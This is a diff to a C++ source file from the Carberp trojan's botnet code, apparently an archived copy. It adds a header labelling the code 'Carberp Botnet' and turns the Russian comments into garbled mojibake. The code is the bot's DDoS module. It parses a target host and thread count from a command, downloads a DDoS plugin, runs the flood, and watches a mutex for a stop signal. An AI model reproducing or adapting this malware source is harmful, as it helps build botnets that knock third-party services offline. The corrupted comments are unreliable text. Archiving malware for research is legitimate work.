@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "ddos.h"
 #include "Plugins.h"
 #include "Utils.h"
@@ -7,7 +18,7 @@
 
 
 //----------------------------------------------------------------------------
-//  Функция процесса для работы DDOS
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DDOS
 //----------------------------------------------------------------------------
 DWORD WINAPI DDOSProces(LPVOID)
 {
@@ -21,7 +32,7 @@ DWORD WINAPI DDOSProces(LPVOID)
 
 	if (STRA::IsEmpty(Args)) Exit;
 
-	// Получаем параметры команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR Host       = STR::GetLeftStr(Args, " ");
 	if (STRA::IsEmpty(Host))
@@ -33,7 +44,7 @@ DWORD WINAPI DDOSProces(LPVOID)
 
     MemFree(Args);
 
-	// Загружаем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	TPlugin Plugin(GetStr(EStrDDOSPlugin));
 
 	if (!Plugin.Download(true)) Exit;
@@ -41,7 +52,7 @@ DWORD WINAPI DDOSProces(LPVOID)
 
 
 
-	// Запускаем DDOS атаку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DDOS пїЅпїЅпїЅпїЅпїЅ
 	typedef int  (WINAPI *TStart)(char*, DWORD, DWORD, DWORD);
 	typedef BOOL (WINAPI *TBusy)();
 	typedef void (WINAPI *TStop)();
@@ -61,16 +72,16 @@ DWORD WINAPI DDOSProces(LPVOID)
 
 	string MutexName = GetStr(EStrDDOSSignal);
 
-	// Стартуем
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Start(Host, Count, 0, 0) == 0)
 	{
-		// Переходим в режим ожидания команды стоп
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		while (Busy())
 		{
 			HANDLE Handle = (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS, false, MutexName.t_str());
 			if (Handle)
             {
-				// Команда получена, плавно прекращаем работу
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				Stop();
 				DWORD St = (DWORD)pGetTickCount();
 				while (Busy() && (DWORD)pGetTickCount() - St < 5000) pSleep(100);
@@ -82,7 +93,7 @@ DWORD WINAPI DDOSProces(LPVOID)
 		}
 	}
 
-    // Освобождаем данные
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free(Host);
 	STR::Free(StrThreads);
 
@@ -92,13 +103,13 @@ DWORD WINAPI DDOSProces(LPVOID)
 
 
 //----------------------------------------------------------------------------
-//  Команда запускает процесс DDOS атаки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DDOS пїЅпїЅпїЅпїЅпїЅ
 //----------------------------------------------------------------------------
 bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
 	if (STRA::IsEmpty(Args)) return false;
 
-	//Проверем на предмет необходимости остановки
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#define COMMAND_STOP 0xE7D37F0 /* stop */
 
 	if (STRA::Hash(Args, 0, true) == COMMAND_STOP)
@@ -109,9 +120,9 @@ bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 		return true;
 	}
 
-	// ------ Запускаем процесс --------
+	// ------ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ --------
 
-	// Сохраняем аргументы команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string FileName = BOT::MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
 
 	DWORD Len = STRA::Length(Args) + 1;
@@ -119,7 +130,7 @@ bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 		return false;
 
 
-	// Запускаем процесс
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	return MegaJump(DDOSProces) == TRUE;
 
 //	return (StartThread(DDOSProces, NULL)) ? true : false;
